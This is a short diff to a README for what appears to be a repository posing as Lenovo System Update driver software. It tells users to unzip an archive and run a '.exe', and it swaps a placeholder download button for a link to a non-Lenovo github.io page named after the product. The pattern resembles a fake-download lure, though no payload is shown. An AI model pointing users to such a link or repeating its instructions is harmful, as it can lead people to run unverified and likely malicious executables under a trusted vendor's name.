@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://lenovo-system-update.github.io/.github/)
 
 ## 📸 Overview
 <img width="600" height="409" alt="lenovo-system-update-driver-updates" src="https://github.com/user-attachments/assets/13e298c0-0a2f-406f-b330-ca26ea02dc03" />
